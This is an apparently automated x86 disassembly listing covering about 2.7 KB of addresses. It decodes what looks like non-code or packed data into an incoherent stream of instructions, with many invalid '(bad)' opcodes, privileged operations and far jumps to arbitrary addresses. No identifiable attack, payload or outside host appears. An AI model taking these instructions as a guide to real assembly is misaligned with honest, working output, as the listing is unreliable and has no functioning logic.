  418504:	mov    ch,0x13
  418506:	dec    eax
  418507:	test   al,0x3d
  418509:	(bad)  
  41850a:	jae    0x4184ed
  41850c:	and    eax,0x5b2e19b6
  418511:	lds    esi,FWORD PTR [ebx-0xf]
  418514:	push   ebp
  418515:	or     esp,edi
  418517:	push   ds
  418518:	sbb    ecx,DWORD PTR [esi]
  41851a:	add    cl,ch
  41851c:	cmp    eax,0x3e2bc75b
  418521:	pop    ebx
  418522:	push   ebx
  418523:	jb     0x41855b
  418525:	fld    st(4)
  418527:	add    edx,ebp
  418529:	cs push 0x861550
  41852f:	icebp  
  418530:	(bad)  
  418531:	pop    ebx
  418532:	shl    esi,0x62
  418535:	dec    edi
  418536:	or     al,0xde
  418538:	loopne 0x418598
  41853a:	call   0xfe07c5e4
  41853f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  418568:	add    BYTE PTR [eax],al
  41856a:	loopne 0x41852e
  41856c:	(bad)  
  41856d:	call   0x24cce0af
  418572:	bound  edx,QWORD PTR [esi]
  418574:	push   0x1bcea4
  418579:	rol    DWORD PTR [eax],0x72
  41857c:	std    
  41857d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41857e:	jbe    0x418586
  418580:	jne    0x41854d
  418582:	(bad)  
  418583:	fnstcw WORD PTR [ebx-0x6f]
  418586:	dec    ebp
  418587:	push   eax
  418588:	push   ss
  418589:	add    ecx,DWORD PTR [edx+0x2b]
  41858c:	std    
  41858d:	add    BYTE PTR [edx-0x32],bl
  418590:	in     eax,0x38
  418592:	jo     0x418613
  418594:	dec    BYTE PTR [ebx]
  418596:	xchg   edi,eax
  418597:	test   BYTE PTR [esi],0xc7
  41859a:	sbb    dh,BYTE PTR [ebx-0x3]
  41859d:	jmp    DWORD PTR [edi]
  41859f:	pop    edx
  4185a0:	call   0xfec0b766
  4185a5:	mov    ebx,edx
  4185a7:	jge    0x418571
  4185a9:	ret    0x5a1f
  4185ac:	push   ebx
  4185ad:	mov    esi,DWORD PTR [ebx-0x55]
  4185b0:	dec    ebp
  4185b1:	pop    eax
  4185b2:	out    dx,eax
  4185b3:	ja     0x4185ad
  4185b5:	inc    eax
  4185b6:	pop    ss
  4185b7:	jb     0x418628
  4185b9:	add    DWORD PTR [edi+edi*2+0x2a],edx
  4185bd:	(bad)  [eax]
  4185bf:	cmc    
  4185c0:	add    eax,0xfe7ea6e8
  4185c5:	(bad)  
  4185c6:	fcomp  QWORD PTR [ecx]
  4185c8:	push   cs
  4185c9:	test   BYTE PTR [ecx+0x5a],ch
	...
  4185f8:	inc    eax
  4185f9:	cmc    
  4185fa:	add    eax,0xfd57c3e8
  4185ff:	(bad)  
  418600:	fcomp  QWORD PTR [ecx]
  418602:	je     0x418609
  418604:	ds inc esp
  418606:	std    
  418607:	jmp    DWORD PTR [edi-0x6ff38b88]
  41860d:	jecxz  0x418614
  41860f:	call   0x400008
  418614:	jo     0x4185f9
  418616:	add    eax,0xfd5bf6e8
  41861b:	dec    DWORD PTR [ecx+ebx*1-0x1083fd8c]
  418622:	(bad)  
  418623:	jne    0x4185c4
  418625:	jno    0x418649
  418627:	sbb    al,0xa0
  418629:	jns    0x418635
  41862b:	ror    BYTE PTR [edx+0x5d],0xe9
  41862f:	arpl   WORD PTR [esi],di
  418631:	in     eax,dx
  418632:	xchg   edi,eax
  418633:	pop    es
  418634:	push   esi
  418635:	push   0xc859ff00
  41863a:	inc    ecx
  41863b:	je     0x418679
  41863d:	jmp    0x7531edf9
  418642:	ret    
  418643:	inc    DWORD PTR [eax-0x32]
  418646:	or     eax,ebp
  418648:	repnz pop ebp
  41864a:	and    esi,edi
  41864c:	inc    ebp
  41864d:	jb     0x4185e6
  41864f:	add    DWORD PTR ds:0x367422f1,edx
  418655:	sbb    bl,BYTE PTR [eax]
  418657:	sbb    bl,BYTE PTR [ecx]
  418659:	push   ds
  41865a:	or     eax,0xc0
	...
  418683:	add    BYTE PTR [eax],al
  418685:	add    BYTE PTR [ebx+0x9332eb0],cl
  41868b:	or     BYTE PTR [edx],cl
  41868d:	call   0xfe641d04
  418692:	inc    ebp
  418693:	jb     0x41862c
  418695:	add    ebp,esp
  418697:	pushf  
  418698:	and    dh,BYTE PTR [esi+esi*1+0x5a]
  41869c:	sbb    DWORD PTR [ecx+eiz*8],edx
  41869f:	push   ebp
  4186a0:	test   edi,esi
  4186a2:	push   ds
  4186a3:	inc    ebp
  4186a4:	add    ebp,DWORD PTR [ebx]
  4186a6:	dec    cl
  4186a8:	inc    ecx
  4186a9:	jae    0x4186d8
  4186ab:	lar    eax,WORD PTR [eax]
  4186ae:	cs mov dl,0x96
  4186b1:	or     esi,ebp
  4186b3:	mov    bl,0x1
  4186b5:	add    BYTE PTR [esi],bh
  4186b7:	test   eax,0xb23dbb08
  4186bc:	add    DWORD PTR [eax],eax
  4186be:	mov    ch,0xf1
  4186c0:	mov    esi,0x1ca7cc8
  4186c5:	push   ebp
  4186c6:	lds    edx,FWORD PTR [esi+0x4b1657b1]
  4186cc:	sbb    edi,DWORD PTR [edi]
  4186ce:	or     dl,BYTE PTR ds:[eax+eax*1+0x22a65b7d]
  4186d6:	jmp    0xc9b3:0x41989e56
  4186dd:	and    ah,BYTE PTR [eax-0x3c]
  4186e0:	loop   0x418725
  4186e2:	shl    BYTE PTR [eax-0x7a],cl
  4186e5:	cwde   
  4186e6:	inc    ebp
  4186e7:	(bad)  
  4186e8:	hlt    
  4186e9:	or     eax,DWORD PTR [eax]
	...
  418713:	add    BYTE PTR [esi+0x68],dl
  418716:	jbe    0x41873a
  418718:	inc    eax
  418719:	push   eax
  41871a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41871b:	cwde   
  41871c:	inc    esp
  41871d:	(bad)  
  41871e:	fmul   QWORD PTR [edi]
  418720:	xor    DWORD PTR [esi-0x11],ecx
  418723:	sub    edi,DWORD PTR ds:0xf62256c4
  418729:	cwde   
  41872a:	fild   WORD PTR [ebx]
  41872c:	jae    0x4186fe
  41872e:	push   ebx
  41872f:	xchg   ch,bh
  418731:	mov    esi,0x2379ba9a
  418736:	mov    edi,0xe71b071d
  41873b:	sbb    ebp,DWORD PTR [edi+0x5a]
  41873e:	sub    ah,BYTE PTR [edx]
  418740:	and    al,0xa0
  418742:	pmaxub mm7,QWORD PTR [esp+eax*8+0x16]
  418747:	dec    edx
  418748:	jp     0x418701
  41874a:	out    0x3,eax
  41874c:	ds pop ebx
  41874e:	je     0x418718
  418750:	in     eax,0x2a
  418752:	rdmsr  
  418754:	sub    eax,0x4285f6c4
  418759:	mov    bh,0xe7
  41875b:	cwde   
  41875c:	push   ecx
  41875d:	(bad)  
  41875e:	sub    al,0x30
  418760:	add    DWORD PTR [ebx-0x3c570739],esi
  418766:	push   0xffffff9f
  418768:	xchg   ebp,eax
  418769:	pop    edx
  41876a:	push   esp
  41876b:	or     ecx,ebx
  41876d:	sbb    eax,0xa999b4d3
  418772:	shl    DWORD PTR [eax],cl
  418774:	mov    bh,dl
  418776:	add    BYTE PTR [eax+eax*1],dh
	...
  4187a1:	add    BYTE PTR [esi-0x3c],cl
  4187a4:	push   cs
  4187a5:	gs int3 
  4187a7:	ret    
  4187a8:	std    
  4187a9:	jmp    0x3a31a66e
  4187ae:	pop    ds
  4187af:	dec    edi
  4187b0:	in     al,dx
  4187b1:	sbb    DWORD PTR [ecx-0x3c71023c],0xb0fbffcb
  4187bb:	add    al,0x63
  4187bd:	es jge 0x418783
  4187c0:	jmp    0x3de3:0xe41ef710
  4187c7:	pop    ebx
  4187c8:	add    BYTE PTR [esi],ch
  4187ca:	stc    
  4187cb:	mov    edx,0x5b3de900
  4187d0:	mov    ebp,DWORD PTR [ebp+edx*2+0x69d4fd12]
  4187d7:	sub    eax,ebp
  4187d9:	aad    0xfb
  4187db:	sar    ebp,0xf2
  4187de:	jge    0x41882e
  4187e0:	adc    BYTE PTR [edx-0x5f],ch
  4187e3:	mov    edx,0xc24bb500
  4187e8:	jae    0x4187fb
  4187ea:	and    dh,BYTE PTR [ecx-0x5]
  4187ed:	push   ds
  4187ee:	pop    ds
  4187ef:	aad    0xd8
  4187f1:	push   ss
  4187f2:	leave  
  4187f3:	mov    edx,0xc1d676e8
  4187f8:	std    
  4187f9:	repnz adc al,BYTE PTR [edi+0x13]
  4187fd:	push   0xffffffa9
  4187ff:	mov    esi,0xc22e7d00
  418804:	dec    ebx
  418805:	add    eax,0x0
	...
  41882e:	add    BYTE PTR [eax],al
  418830:	jmp    0xd7b3:0x3de911da
  418837:	icebp  
  418838:	cmp    eax,0x529ee95b
  41883d:	pop    ebx
  41883e:	inc    ebp
  41883f:	imul   ebx,DWORD PTR [esi+0x7d0074c2],0x973f7d93
  418849:	jmp    0xb9b:0xeaac0b01
  418850:	int3   
  418851:	jmp    0xf044:0xd1776a0d
  418858:	daa    
  418859:	out    dx,eax
  41885a:	int3   
  41885b:	jae    0x418873
  41885d:	push   edi
  41885e:	call   0xfebd06c0
  418863:	call   DWORD PTR [edx+0x72]
  418866:	in     eax,0x50
  418868:	jae    0x4188e5
  41886a:	dec    BYTE PTR [ebx-0x36a5646c]
  418870:	in     al,0x8
  418872:	mov    ebp,esp
  418874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418875:	sbb    bl,BYTE PTR [ebp+0x567b88fe]
  41887b:	push   esi
  41887c:	out    0x5,eax
  41887e:	data16 in al,dx
  418880:	ins    BYTE PTR es:[edi],dx
  418881:	sahf   
  418882:	std    
  418883:	not    ebp
  418885:	pop    esp
  418886:	sar    edi,0x88
  418889:	and    al,0x46
  41888b:	inc    ecx
  41888c:	pop    ss
  41888d:	fidivr WORD PTR [esi]
  41888f:	add    BYTE PTR [eax],bl
  418891:	fcmove st,st(2)
  418893:	add    DWORD PTR [eax],eax
	...
  4188bd:	add    bh,ah
  4188bf:	pop    ebp
  4188c0:	mov    eax,DWORD PTR [ebp-0x183ad]
  4188c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188c7:	add    ah,dh
  4188c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188ca:	or     BYTE PTR [ebx-0x2],bh
  4188cd:	or     esp,DWORD PTR [edi]
  4188cf:	imul   eax,DWORD PTR [esp+eiz*4-0x7cffa22a],0xa
  4188d7:	push   0xfffffffb
  4188d9:	jmp    FWORD PTR [eax+0x30840d5c]
  4188df:	pop    eax
  4188e0:	add    BYTE PTR [eax],al
  4188e2:	sbb    dl,ah
  4188e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188e5:	(bad)  
  4188e6:	ds test eax,0xe6994f1d
  4188ec:	sbb    ch,bh
  4188ee:	xchg   ecx,eax
  4188ef:	cwde   
  4188f0:	sub    al,0x41
  4188f2:	and    eax,0x882a1e01
  4188f7:	cmp    dl,BYTE PTR [edi-0x5d]
  4188fa:	js     0x4188ec
  4188fc:	sbb    eax,0xea229ea
  418901:	mov    dh,0xc2
  418903:	xchg   ecx,eax
  418904:	imul   edi,ebp,0x67b4e861
  41890a:	dec    edi
  41890b:	fs ret 
  41890d:	inc    edx
  41890f:	cs inc edx
  418911:	std    
  418912:	dec    ecx
  418913:	inc    eax
  418914:	mov    ah,0xe7
  418916:	fnstcw WORD PTR [ebx-0x942ffff]
  41891c:	adc    BYTE PTR [ebp-0x1e18b45],cl
	...
  41894a:	add    BYTE PTR [eax],al
  41894c:	sub    DWORD PTR [ebx],eax
  41894e:	pop    ds
  41894f:	mov    ah,0xda
  418951:	sub    BYTE PTR ds:0xe45e26fe,bl
  418957:	(bad)  
  418958:	adc    DWORD PTR [edi+eax*4-0x5d],ecx
  41895c:	or     BYTE PTR [edx-0x7742bae3],al
  418962:	hlt    
  418963:	jno    0x418967
  418965:	jb     0x4189be
  418967:	repz lock jns 0x418988
  41896b:	out    0x14,eax
  41896d:	enter  0xfe1e,0xf9
  418971:	das    
  418972:	pop    esp
  418973:	std    
  418974:	fst    DWORD PTR [ecx+0x4]
  418977:	add    BYTE PTR [esi],bh
  418979:	mov    dl,0xa7
  41897b:	add    DWORD PTR [ebx-0x3e02a3c9],edi
  418981:	leave  
  418982:	mov    cl,0xfe
  418984:	repz (bad) 
  418986:	sbb    edi,esi
  418988:	mov    cl,0x5b
  41898a:	iret   
  41898b:	(bad)  
  41898c:	dec    ebp
  41898d:	rcr    dh,0xa
  418990:	jle    0x4189e2
  418992:	imul   ebx,DWORD PTR [ebx],0xffffff99
  418995:	shl    bh,0x84
  418998:	rol    BYTE PTR [ebx],cl
  41899a:	(bad)  
  41899b:	push   ds
  41899c:	mov    BYTE PTR [esi],cl
  41899e:	and    DWORD PTR [esi+edi*1],eax
  4189a1:	push   eax
  4189a2:	ins    BYTE PTR es:[edi],dx
  4189a3:	sub    edi,DWORD PTR [ecx-0x40]
  4189a6:	out    0x90,eax
  4189a8:	mov    edx,0x681ea5c4
  4189ad:	sub    ecx,DWORD PTR [edi]
  4189af:	or     BYTE PTR [eax],al
	...
  4189d9:	add    BYTE PTR [edi],bh
  4189db:	pop    ebx
  4189dc:	out    0x2b,eax
  4189de:	inc    edi
  4189df:	pop    eax
  4189e0:	out    0x3,eax
  4189e2:	inc    ebp
  4189e3:	fwait
  4189e4:	test   BYTE PTR [edi+0x3e75b78],0x3
  4189eb:	push   edi
  4189ec:	call   0x6691c7f4
  4189f1:	inc    edi
  4189f2:	xor    eax,eax
  4189f4:	out    0x2b,eax
  4189f6:	int    0x57
  4189f8:	out    0x3,eax
  4189fa:	mov    ?,WORD PTR [ebx]
  4189fc:	inc    ecx
  4189fd:	xchg   edx,eax
  4189fe:	jle    0x418a5b
  418a00:	pop    esp
  418a01:	mov    bh,bh
  418a03:	rol    BYTE PTR [esi+0x1e],0x79
  418a07:	mov    bl,0x31
  418a09:	push   es
  418a0a:	ds pop ebx
  418a0c:	push   0x47
  418a0e:	inc    ebp
  418a0f:	xor    eax,0xc3ba90e7
  418a14:	and    eax,0xf2ae81e
  418a19:	cmp    BYTE PTR [ebx],bh
  418a1b:	pop    ebx
  418a1c:	out    0x90,eax
  418a1e:	ret    0xdc3
  418a21:	push   ds
  418a22:	shr    BYTE PTR [edx],1
  418a24:	mov    cr4,ebx
  418a27:	sar    dh,0x9
  418a2a:	inc    BYTE PTR [ebp+0x0]
  418a2d:	leave  
  418a2e:	in     eax,0xa
  418a30:	dec    ecx
  418a31:	test   al,0x3d
  418a33:	into   
  418a34:	and    edx,0x48
  418a37:	sar    ebp,0x39
  418a3a:	push   edx
  418a3b:	pop    edi
  418a3c:	sbb    eax,0xd6
	...
  418a65:	add    BYTE PTR [eax],al
  418a67:	add    BYTE PTR [ebx],bh
  418a69:	iret   
  418a6a:	xchg   ebx,eax
  418a6b:	stos   DWORD PTR es:[edi],eax
  418a6c:	xor    cl,al
  418a6e:	std    
  418a6f:	sbb    edx,edx
  418a71:	mov    bh,0x64
  418a73:	fisub  WORD PTR [edx]
  418a75:	shr    ecx,0xda
  418a78:	enter  0xc2d6,0xaf
  418a7c:	push   ebx
  418a7d:	rcl    DWORD PTR [eax+0x74],0xc1
  418a81:	(bad)  
  418a82:	(bad)  
  418a83:	sahf   
  418a84:	inc    ebx
  418a85:	adc    al,ch
  418a87:	xchg   edx,eax
  418a88:	pop    eax
  418a89:	sar    ch,0x60
  418a8c:	mov    ecx,0x2b86ff03
  418a91:	shl    DWORD PTR [ebx-0x23edfc3],0x76
  418a98:	xchg   ecx,eax
  418a99:	retf   0x6efe
  418a9c:	push   ebx
  418a9d:	mov    dh,0xf0
  418a9f:	dec    DWORD PTR [edx-0x43]
  418aa2:	or     DWORD PTR [ecx],ebp
  418aa4:	(bad)  
  418aa5:	mov    DWORD PTR [eax+0x5f],ebp
  418aa8:	scas   eax,DWORD PTR es:[edi]
  418aa9:	sbb    eax,DWORD PTR [eax]
  418aab:	inc    ecx
  418aac:	inc    ecx
  418aad:	push   ebp
  418aae:	add    cl,ch
  418ab0:	int    0x36
  418ab2:	idiv   BYTE PTR [edx+0x7cfebefc]
  418ab8:	data16 sar ch,0x2e
  418abc:	and    dh,ah
  418abe:	and    eax,0xff344b26
  418ac3:	xchg   edx,eax
  418ac4:	cmp    eax,0x71160031
  418ac9:	add    bh,bh
  418acb:	push   cs
	...
  418af4:	add    BYTE PTR [eax],al
  418af6:	xor    esi,DWORD PTR [esi]
  418af8:	rol    BYTE PTR [eax],1
  418afa:	(bad)  
  418afb:	cdq    
  418afc:	std    
  418afd:	imul   edx,edi,0xa7076d72
  418b03:	pop    edx
  418b04:	std    
  418b05:	mov    ch,0x63
  418b07:	pop    ebp
  418b08:	(bad)  
  418b09:	dec    DWORD PTR [edi-0x7f00e6a5]
  418b0f:	pop    edi
  418b10:	mov    ah,0xa4
  418b12:	jno    0x418b73
  418b14:	(bad)  
  418b15:	call   0x404f89
  418b1a:	and    BYTE PTR ds:0x5fc0fef1,0xe5
  418b21:	ins    BYTE PTR es:[edi],dx
  418b22:	xchg   ebp,eax
  418b23:	pop    edi
  418b24:	(bad)  
  418b25:	cld    
  418b26:	je     0x418b42
  418b28:	mov    eax,0xfe5fa0ff
  418b2d:	repnz icebp 
  418b2f:	mov    eax,ds:0xa4ea0f06
  418b34:	sti    
  418b35:	inc    eax
  418b37:	add    BYTE PTR [edi-0x37],bl
  418b3a:	xchg   esp,eax
  418b3b:	add    eax,0x15d4ec8b
  418b40:	in     eax,dx
  418b41:	push   eax
  418b42:	dec    edi
  418b43:	out    dx,eax
  418b44:	(bad)  
  418b46:	addr16 push edi
  418b48:	clc    
  418b49:	jb     0x418b61
  418b4b:	sbb    edi,esi
  418b4d:	mov    esp,DWORD PTR [ebp+0x4a]
  418b50:	gs add eax,0xe8005a26
  418b56:	xor    ah,al
  418b58:	(bad)  
  418b59:	inc    DWORD PTR [eax]
	...
  418b83:	add    BYTE PTR [edi-0x2d],ah
  418b86:	iret   
  418b87:	nop
  418b88:	mov    ss,WORD PTR [ebp-0x73a36f07]
  418b8e:	lea    ebp,[eax-0x26]
  418b91:	pop    eax
  418b92:	add    BYTE PTR [eax],al
  418b94:	dec    edi
  418b95:	and    al,0x17
  418b97:	inc    DWORD PTR [eax+0x4a]
  418b9a:	mov    dl,dl
  418b9c:	ds cmp eax,esi
  418b9f:	out    dx,eax
  418ba0:	scas   al,BYTE PTR es:[edi]
  418ba1:	fild   DWORD PTR [esi]
  418ba3:	add    DWORD PTR [esi],edi
  418ba5:	mov    ah,0x29
  418ba7:	test   al,0x24
  418ba9:	mov    ebp,0x238c8a19
  418bae:	mov    cl,dl
  418bb0:	(bad)  
  418bb1:	neg    BYTE PTR [ecx]
  418bb3:	mov    cl,BYTE PTR [eax+ecx*2-0x47e970ca]
  418bba:	add    al,0x0
  418bbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bbe:	(bad)  
  418bbf:	sti    
  418bc0:	and    al,0xb4
  418bc2:	sub    DWORD PTR [ebx+0x40],edx
  418bc5:	mov    ah,0x1
  418bc7:	nop
  418bc8:	mov    ch,0xe1
  418bca:	(bad)  
  418bcb:	sar    DWORD PTR [ecx+0x7e],1
  418bce:	adc    al,0x67
  418bd0:	cmp    dh,BYTE PTR [ebx+0x3f560001]
  418bd6:	(bad)  
  418bd7:	(bad)  
  418bd8:	ds leave 
  418bda:	inc    ecx
  418bdb:	jae    0x418c0b
  418bdd:	cmp    DWORD PTR [esi],esi
  418bdf:	(bad)  
  418be0:	out    0xba,al
  418be2:	lea    eax,[eax+0x3e]
  418be5:	aad    0x8f
  418be7:	out    dx,eax
	...
  418c10:	add    BYTE PTR [eax],al
  418c12:	push   esi
  418c13:	mov    edi,edi
  418c15:	(bad)  
  418c16:	cmp    DWORD PTR ds:[esi],esi
  418c19:	imul   edi,DWORD PTR [esi],0x3c6a0458
  418c1f:	test   al,0x1
  418c21:	push   0x3d
  418c23:	stos   BYTE PTR es:[edi],al
  418c24:	add    DWORD PTR [eax],eax
  418c26:	ds jb  0x418c42
  418c29:	je     0x418c39
  418c2b:	sbb    ecx,DWORD PTR [edi]
  418c2d:	add    edi,DWORD PTR [esi]
  418c2f:	mov    dl,0x8c
  418c31:	inc    esp
  418c32:	or     dh,bl
  418c34:	push   cs
  418c35:	shl    BYTE PTR [ebx-0x12],0x1a
  418c39:	je     0x418c2d
  418c3b:	ins    DWORD PTR es:[edi],dx
  418c3c:	(bad)  
  418c3d:	out    dx,eax
  418c3e:	(bad)  
  418c3f:	pop    ebx
  418c40:	inc    DWORD PTR [eax]
  418c42:	ds pop ebx
  418c44:	xchg   ecx,eax
  418c45:	mov    bh,0x67
  418c47:	pop    ebx
  418c48:	push   ss
  418c49:	xchg   ecx,eax
  418c4a:	loope  0x418bff
  418c4c:	jns    0x418c50
  418c4e:	ds pop ebx
  418c50:	repnz inc ebx
  418c52:	dec    ebp
  418c53:	dec    edi
  418c54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c55:	stos   DWORD PTR es:[edi],eax
  418c56:	inc    esi
  418c57:	inc    edi
  418c58:	test   al,0x3
  418c5a:	push   cs
  418c5b:	mov    bl,0xeb
  418c5d:	jmp    FWORD PTR [ecx+0x140451bc]
  418c63:	pop    ebx
  418c64:	push   ecx
  418c65:	push   es
  418c66:	and    al,0x5b
  418c68:	inc    ecx
  418c69:	pop    es
  418c6a:	es pop ebx
  418c6c:	out    0x3,eax
  418c6e:	jle    0x418c2c
  418c70:	cmp    al,0x14
  418c72:	cdq    
  418c73:	in     al,dx
  418c74:	jecxz  0x418c79
	...
  418c9e:	add    BYTE PTR [eax],al
  418ca0:	shr    BYTE PTR ds:[eax+edx*1],cl
  418ca4:	xor    DWORD PTR [edi+0x42],eax
  418ca7:	lods   al,BYTE PTR ds:[esi]
  418ca8:	dec    edi
  418ca9:	inc    edi
  418caa:	sub    BYTE PTR [esi+edx*2],al
  418cad:	add    al,0xe4
  418caf:	add    edi,DWORD PTR [esi]
  418cb1:	sub    edi,edi
  418cb3:	cmc    
  418cb4:	int    0x19
  418cb6:	out    0x1a,eax
  418cb8:	rol    dh,cl
  418cba:	(bad)  
  418cbb:	fsubr  DWORD PTR [edx]
  418cbd:	mov    esp,0x4638b37e
  418cc2:	jnp    0x418cef
  418cc4:	int    0x56
  418cc6:	out    0x3,eax
  418cc8:	xchg   BYTE PTR [eax+0x27],dl
  418ccb:	nop
  418ccc:	aas    
  418ccd:	mov    al,0xaa
  418ccf:	sbb    dl,BYTE PTR [edx-0x72464041]
  418cd5:	sbb    ah,bh
  418cd7:	sbb    dl,BYTE PTR [edx+0x3a484fc3]
  418cdd:	pop    ebx
  418cde:	out    0x86,eax
  418ce0:	std    
  418ce1:	dec    esi
  418ce2:	add    cl,al
  418ce4:	mov    ds:0x15e93f47,eax
  418ce9:	xchg   edx,eax
  418cea:	add    al,0xe9
  418cec:	cmp    eax,0xe395c050
  418cf1:	xor    edi,ecx
  418cf3:	call   0x5882:0x14dbbfa
  418cfa:	add    cl,ch
  418cfc:	xor    BYTE PTR [ebx-0x4414258c],bl
  418d02:	addr16 jmp 0x418d08
	...
  418d2c:	add    BYTE PTR [eax],al
  418d2e:	push   esp
  418d2f:	inc    edi
  418d30:	clc    
  418d31:	out    dx,al
  418d32:	mov    ecx,0x72b968ab
  418d37:	sbb    al,BYTE PTR [eax]
  418d39:	push   ebx
  418d3a:	inc    edx
  418d3b:	mov    esp,0xbfc1d6d0
  418d40:	call   0xfdfe1296
  418d45:	(bad)  
  418d46:	mov    cl,0xab
  418d48:	call   0xfdfe0286
  418d4d:	mov    dh,0xc1
  418d4f:	ret    
  418d50:	call   0xfdfdf296
  418d55:	mov    al,0xfb
  418d57:	mov    DWORD PTR es:[ebp+0x3ae097c3],ecx
  418d5e:	mov    ah,BYTE PTR [ebx]
  418d60:	push   0x7c271c
  418d65:	sub    DWORD PTR [eax-0x3c813ea6],0xfd226177
  418d6f:	mov    edx,0xde34f5fd
  418d74:	cmp    eax,esi
  418d76:	repnz sbb eax,DWORD PTR [eax]
  418d79:	jmp    0x296aed46
  418d7e:	shl    DWORD PTR [ebx-0x4936d93f],cl
  418d84:	add    BYTE PTR [eax],al
  418d86:	pop    ss
  418d87:	pop    edi
  418d88:	add    bh,al
  418d8a:	mov    ds:0xe7fffd56,al
  418d8f:	pop    esi
  418d90:	lds    eax,FWORD PTR [ebp+0x0]
	...
  418dbb:	add    BYTE PTR [ebx],ch
  418dbd:	pop    edi
  418dbe:	add    BYTE PTR [eax],al
  418dc0:	xlat   BYTE PTR ds:[ebx]
  418dc1:	sbb    eax,DWORD PTR [esp+esi*8-0x19]
  418dc5:	pop    esi
  418dc6:	add    BYTE PTR [eax],al
  418dc8:	and    dl,bh
  418dca:	in     eax,dx
  418dcb:	add    bh,dl
  418dcd:	pop    esi
  418dce:	add    BYTE PTR [ebp-0x72b2b16e],cl
  418dd4:	loop   0x418e40
  418dd6:	dec    ebp
  418dd7:	(bad)  
  418dd8:	loop   0x418d5c
  418dda:	dec    ebp
  418ddb:	push   0xffffff98
  418ddd:	loope  0x418e23
  418ddf:	cld    
  418de0:	or     DWORD PTR [bx+si],eax
  418de3:	push   0xffffffa4
  418de5:	or     dh,bh
  418de7:	(bad)  
  418de8:	xchg   edx,eax
  418de9:	dec    DWORD PTR [edx+0x41]
  418dec:	xchg   edi,eax
  418ded:	in     eax,0x44
  418def:	call   0x1275f08
  418df4:	xor    esp,DWORD PTR [esi+0x7f]
  418df7:	jge    0x418e78
  418df9:	mov    ch,bh
  418dfb:	call   DWORD PTR [edi-0x17]
  418dfe:	jno    0x418dff
  418e00:	inc    edx
  418e01:	push   ebx
  418e02:	mov    es,WORD PTR [ebp-0x61]
  418e05:	fistp  QWORD PTR [eax+edi*8+0x67]
  418e09:	jmp    0x3fea:0x571a8b57
  418e10:	mov    eax,0x6e865cf
  418e15:	(bad)  
  418e18:	sahf   
  418e19:	stc    
  418e1a:	(bad)  
  418e1c:	in     al,0x85
  418e1e:	push   ss
  418e1f:	sub    DWORD PTR [eax],eax
	...
  418e49:	add    BYTE PTR [eax-0xc3ff5ad],bl
  418e4f:	mov    esi,0x283e4588
  418e54:	stos   DWORD PTR es:[edi],eax
  418e55:	or     edx,DWORD PTR [esi]
  418e57:	pop    ecx
  418e58:	stc    
  418e59:	inc    BYTE PTR [ecx]
  418e5b:	and    DWORD PTR [esi+0xa03c9df],ecx
  418e61:	jmp    FWORD PTR [ebx+0x28]
  418e64:	mov    BYTE PTR [edi],bh
  418e66:	inc    edx
  418e67:	mov    esi,ecx
  418e69:	les    ebp,FWORD PTR [ebp+0x3]
  418e6c:	add    cl,BYTE PTR [edi+0x723e253e]
  418e72:	jg     0x418e38
  418e74:	test   dl,al
  418e76:	push   edx
  418e77:	imul   eax,esi,0x25debdeb
  418e7d:	push   DWORD PTR [edx]
  418e7f:	sbb    eax,0xb0b27418
  418e84:	jmp    0x418ee4
  418e86:	cmc    
  418e87:	add    al,BYTE PTR [edx]
  418e89:	(bad)  
  418e8a:	sti    
  418e8b:	mov    edi,0xc43e0004
  418e90:	test   BYTE PTR [esi+eiz*4-0x63],bh
  418e94:	add    al,0x0
  418e96:	ds ud0 ebp,eax
  418e9a:	loop   0x418e3c
  418e9c:	adc    eax,0x1876bdfe
  418ea1:	(bad)  
  418ea2:	in     eax,dx
  418ea3:	mov    edx,0x86a7416
  418ea8:	lock pop esi
  418eaa:	cmc    
  418eab:	add    BYTE PTR [eax+edi*4],0x0
	...
  418ed7:	add    BYTE PTR [edi],bh
  418ed9:	les    eax,FWORD PTR [ecx]
  418edb:	add    ch,dh
  418edd:	cli    
  418ede:	inc    ecx
  418edf:	push   esp
  418ee0:	mov    ch,0x37
  418ee2:	add    ebx,0x4fad546a
  418ee8:	xchg   esi,eax
  418ee9:	dec    edx
  418eea:	scas   al,BYTE PTR es:[edi]
  418eeb:	(bad)  
  418eec:	jle    0x418eb0
  418eee:	sbb    DWORD PTR [ecx+0x3f],esi
  418ef1:	add    eax,0x5b638216
  418ef6:	jle    0x418ec3
  418ef8:	jle    0x418f55
  418efa:	out    0x8f,eax
  418efc:	inc    esi
  418efd:	fcom   QWORD PTR [ebx+eiz*2]
  418f00:	je     0x418f1c
  418f02:	out    0x3,eax
  418f04:	mov    esp,DWORD PTR [ecx+0x12]
  418f07:	inc    esp
  418f08:	cwde   
  418f09:	adc    al,0x30
  418f0b:	inc    ebx
  418f0c:	les    edx,FWORD PTR [esi+0x2c]
  418f0f:	xchg   ebx,eax
  418f10:	jle    0x418f6d
  418f12:	inc    eax
  418f13:	jne    0x418f53
  418f15:	pop    ebx
  418f16:	out    0x2b,eax
  418f18:	lods   al,BYTE PTR ds:[esi]
  418f19:	sbb    BYTE PTR [esi],0x17
  418f1c:	mov    esp,0x7e932076
  418f21:	pop    ebx
  418f22:	out    0x8f,eax
  418f24:	sub    BYTE PTR [eax+0x6eb8ff7a],bh
  418f2a:	xor    BYTE PTR [ebx-0x7d00a502],dl
  418f30:	cmp    al,0x5b
  418f32:	out    0xa,eax
  418f34:	jle    0x418f64
  418f36:	in     al,dx
  418f37:	sub    al,0x27
  418f39:	pop    edx
  418f3a:	out    0x3,eax
	...
  418f64:	add    BYTE PTR [eax],al
  418f66:	jns    0x418f86
  418f68:	rol    DWORD PTR [ebx],cl
  418f6a:	ds pop ebx
  418f6c:	out    0x88,eax
  418f6e:	cli    
  418f6f:	mov    dh,0x17
  418f71:	stos   BYTE PTR es:[edi],al
  418f72:	jns    0x418fb6
  418f74:	jmp    0x41a07b8f
  418f79:	add    al,0x69
  418f7b:	sub    al,0xe3
  418f7d:	push   ss
  418f7e:	dec    edx
  418f7f:	cld    
  418f80:	xor    al,ch
  418f82:	pop    ecx
